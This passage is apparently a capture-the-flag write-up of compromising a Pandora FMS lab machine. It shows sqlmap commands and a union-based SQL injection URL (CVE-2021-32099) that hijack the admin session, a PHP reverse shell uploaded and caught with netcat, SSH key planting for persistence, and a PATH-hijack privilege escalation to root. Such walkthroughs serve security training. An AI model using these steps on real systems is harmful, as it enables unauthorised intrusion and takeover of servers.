http://127.0.0.1:8080/pandora_console/ <span style=color:#f92672>[</span><span style=color:#ae81ff>200</span> OK<span style=color:#f92672>]</span> Apache<span style=color:#f92672>[</span>2.4.41<span style=color:#f92672>]</span>, Cookies<span style=color:#f92672>[</span>PHPSESSID,errormsg<span style=color:#f92672>]</span>, Country<span style=color:#f92672>[</span>RESERVED<span style=color:#f92672>]</span><span style=color:#f92672>[</span>ZZ<span style=color:#f92672>]</span>, HTTPServer<span style=color:#f92672>[</span>Ubuntu Linux<span style=color:#f92672>]</span><span style=color:#f92672>[</span>Apache/2.4.41 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span><span style=color:#f92672>]</span>, IP<span style=color:#f92672>[</span>127.0.0.1<span style=color:#f92672>]</span>, JQuery<span style=color:#f92672>[</span>3.3.1<span style=color:#f92672>]</span>, Meta-Author<span style=color:#f92672>[</span>Ártica ST<span style=color:#f92672>]</span>, Pandora-FMS, PasswordField<span style=color:#f92672>[</span>pass<span style=color:#f92672>]</span>, Script<span style=color:#f92672>[</span>javascript,text/javascript<span style=color:#f92672>]</span>, Title<span style=color:#f92672>[</span>Pandora FMS - the Flexible Monitoring System<span style=color:#f92672>]</span>
</code></pre></div><p>It is running <em>Pandora-FMS v7.0NG.742_FIX_PERL2020</em> , Googling around the version figured out that this version was vulnerable to CVE-2021-32099 (Unauthenticated SQL Injection).</p><p><img src=/assets/Pasted%20image%2020220327082335.png alt="assets/Pasted image 20220327082335.png"></p><p><img src=/assets/Pasted%20image%2020220327083910.png alt="assets/Pasted image 20220327083910.png"></p><p>From the references we found the <a href=https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained>blog</a> containing the details to exploit the vulnerability to gain admin access.</p><p><img src=/assets/Pasted%20image%2020220325014342.png alt="assets/Pasted image 20220325014342.png"></p><p>From the <a href=https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained>blog</a> we found out that the <em>session_id</em> parameter in chart_generator.php file was vulnerable to sql injection.
Let&rsquo;s fireup the sqlmap and dump the data , that we can further use to gain admin or higher privilege user access.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sqlmap -u <span style=color:#e6db74>&#34;http://localhost:8080/pandora_console/include/chart_generator.php?session_id=test&#34;</span> -p session_id --dbs

</code></pre></div><p>We found <em>pandora</em> daatabase, Let&rsquo;s list out all the tables of this database.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>sqlmap -u <span style=color:#e6db74>&#34;http://localhost:8080/pandora_console/include/chart_generator.php?session_id=test&#34;</span> -p session_id --dbms<span style=color:#f92672>=</span>mysql -D pandora --tables
</code></pre></div><p>Out of many tables we found, <em>tsessions_php</em> table seems intersting as it may be possibly contains the all logged in sessions data.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>sqlmap -u <span style=color:#e6db74>&#34;http://localhost:8080/pandora_console/include/chart_generator.php?session_id=test&#34;</span> -p session_id --dbms<span style=color:#f92672>=</span>mysql -D pandora -T tsessions_php --dump
</code></pre></div><p>Out of many session data , One interesting session data we found was of <em>admin</em>.
Let&rsquo;s Put the session data into cookies (Use cookie manager)</p><p><img src=/assets/Pasted%20image%2020220325052220.png alt="assets/Pasted image 20220325052220.png"></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>s5d7jknub9hdfck9n5oqjvqneg,<span style=color:#e6db74>&#34;id_usuario|s:5:&#34;</span><span style=color:#e6db74>&#34;admin&#34;</span><span style=color:#e6db74>&#34;;&#34;</span>,1648199800
</code></pre></div><p>Refresh the login page and we should be now able to login as admin account.</p><p>OR</p><p>We can also use <a href=https://github.com/zjicmDarkWing/CVE-2021-32099>this</a> POC to directly get the admin login access.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>http://127.0.0.1:8080/pandora_console/include/chart_generator.php?session_id<span style=color:#f92672>=</span>%27%20union%20SELECT%201,2,%27id_usuario%7Cs:5:%22admin%22;%27%20as%20data%20--%20SgGO
</code></pre></div><p>Access the above url and then access the login page http://127.0.0.1:8080/pandora_console/ , You should have logged in as admin user.</p><p>Going through the monitoring Dashboard and its functionality figured out that we can upload php files through <strong>Admin-Tools > File-Manager</strong> , by creating a new file and uploading a PHP reverse shell.</p><p>We are able to upload the php-reverse-shell , But we don&rsquo;t know the exact location of the upload directory, So let&rsquo;s bruteforce the /pandora_console directory using gobuster.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://127.0.0.1:8080/pandora_console/ -t <span style=color:#ae81ff>100</span> -x php,html,jpg,txt --no-tls-validation -q
/tools                <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 329<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://127.0.0.1:8080/pandora_console/tools/<span style=color:#f92672>]</span>
/index.php            <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 13859<span style=color:#f92672>]</span>                                                 
/images               <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 330<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://127.0.0.1:8080/pandora_console/images/<span style=color:#f92672>]</span>
/general              <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 331<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://127.0.0.1:8080/pandora_console/general/<span style=color:#f92672>]</span>
/mobile               <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 330<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://127.0.0.1:8080/pandora_console/mobile/<span style=color:#f92672>]</span> 
/tests                <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 329<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://127.0.0.1:8080/pandora_console/tests/<span style=color:#f92672>]</span>  
/ajax.php             <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 3211<span style=color:#f92672>]</span>                                                    
/ws.php               <span style=color:#f92672>(</span>Status: 302<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://127.0.0.1:8080/pandora_console/index.php<span style=color:#f92672>]</span> 
/include              <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 331<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://127.0.0.1:8080/pandora_console/include/<span style=color:#f92672>]</span>
/vendor               <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 330<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://127.0.0.1:8080/pandora_console/vendor/<span style=color:#f92672>]</span> 
/extras               <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 330<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://127.0.0.1:8080/pandora_console/extras/<span style=color:#f92672>]</span> 
/extensions           <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 334<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://127.0.0.1:8080/pandora_console/extensions/<span style=color:#f92672>]</span>
</code></pre></div><p>Out of all these directories we found, I found the /images directory where everything was located that was being upload through dashboard.</p><p>As we found the location of reverse shell , Let&rsquo;s run a netcat listener and get the connection.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>curl http://127.0.0.1:8080/pandora_console/images/php-reverse-shell.php
</code></pre></div><p>We received the connection on Netcat.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>nc -lnvp 4444
</code></pre></div><p><img src=/assets/Pasted%20image%2020220327091204.png alt="assets/Pasted image 20220327091204.png"></p><p>We got the shell as matt user, Now we are able to grab the user flag.</p><p><img src=/assets/Pasted%20image%2020220327091320.png alt="assets/Pasted image 20220327091320.png"></p><p>We can&rsquo;t access the root flag, So we need to escalate privilege.</p><hr><h1 id=privilege-escalation>Privilege Escalation</h1><p>Let&rsquo;s run the Linpeash to find some possible Privilege escalation vectors.</p><p>From the linpeas result , We found an interesting file <em>/usr/bin/pandora_backup</em>.
This file is owned by root and allowed to run as root by <em>matt</em> user.</p><p><img src=/assets/Pasted%20image%2020220327093131.png alt="assets/Pasted image 20220327093131.png"></p><p>Running <em>file</em> command to figure out the file type.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>file /usr/bin/pandora_backup
</code></pre></div><p><img src=/assets/Pasted%20image%2020220327094534.png alt="assets/Pasted image 20220327094534.png"></p><p>Let&rsquo;s check the content of the file using cat.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>cat /usr/bin/pandora_backup
</code></pre></div><p><img src=/assets/Pasted%20image%2020220327094952.png alt="assets/Pasted image 20220327094952.png"></p><p>During execution file is running <em>tar</em> command without specifying the specific file path, We can try to exploit it. Read more <a href=https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-command-suid-binary-without-command-path>here</a>.</p><p>Before exploiting the PATH environment, Let&rsquo;s get a stable SSH shell by adding the public keys to authorized_keys in /home/matt/.ssh/authorized_keys file.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>ssh-keygen
</code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>└─# cat id_rsa.pub                                                        <span style=color:#ae81ff>1</span> ⚙
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP5yAYA9hwJ8a5MUF8DpWVtz0B08CwGT75h1ZIBSsys7AfZVO7X34oE8MFvs/DP3Cb87llpqkPu/QN+EcSCJIWaxWXWmS6uRVqDWnT/9pZlKSA/ZeqOS2nzBzazRJjRKiYUJ1EWrb8YE+aPpvOP2AbrMI55VLR8AyCBcaXBjAKFZX8Our0DLvopA1WATdHF5Dz8HM/FmT+pXpsOuCopP2xJLBnobIv4Upc1DyWQx/HTCpcJvz9nJ/G2aOBhL99CNajqVtDDJYxddyrUwCoXQTbPgyrAMMS+29uPplnOfD1u7zb6EroUmSD1ISnF8aYf6YOFm11Xg/nhTw8ZggXFnHfLPat4K8BED0OfqUhw8gCGn7UT3nBR5S83S4nq9wV3xsefDJidv1iLevEYFW7d1IpoRpzzizyUzTeWLViUiLC7Nq4krFnh4VrG0c2wF9gJ0/llfPUb17hph6UatekRYf4tvRVZ6kly5t/F7UtV0l78ixTa6Ehca85KA1rdJkPo+U<span style=color:#f92672>=</span> root@kali

</code></pre></div><p>Adding this public key to authorized_keys.</p><p><em>Note : Make sure to set authorized_keys file permission to 600 and .ssh directory permission to 700.</em></p><p>Login to target machine as matt user using ssh.
Let&rsquo;s exploit the pandora_backup executable to launch a shell as root user.
As <em>tar</em> is used to extract something from /root . But the absolute tar path is not used , So we can create a tar file and Hijack the PATH to obtain root.</p><p><img src=/assets/Pasted%20image%2020220327103546.png alt="assets/Pasted image 20220327103546.png"></p><p>We created a local file with contents &ldquo;/bin/bash&rdquo; , and append the Current directory Path to the PATH env variable and run the Binary and we get the root access.</p><p>Let&rsquo;s Grab the Root Flag.</p><p><img src=/assets/Pasted%20image%2020220327103632.png alt="assets/Pasted image 20220327103632.png"></p><h6 id=thank-you-for-reading>Thank You For Reading</h6><hr></div></article><hr><div class=post-info></div></main></div><footer class=footer><div class=footer__inner></div><div class=footer__inner><div class=footer__content><span></span><span>Made with 💛 by <a href=/>An0nud4y</a></span></div></div></footer></div><script type=text/javascript src=/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js integrity="sha512-3HFukJLJggt3+W2ilNASCu6xibW86pdSMJ6+on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script></body></html>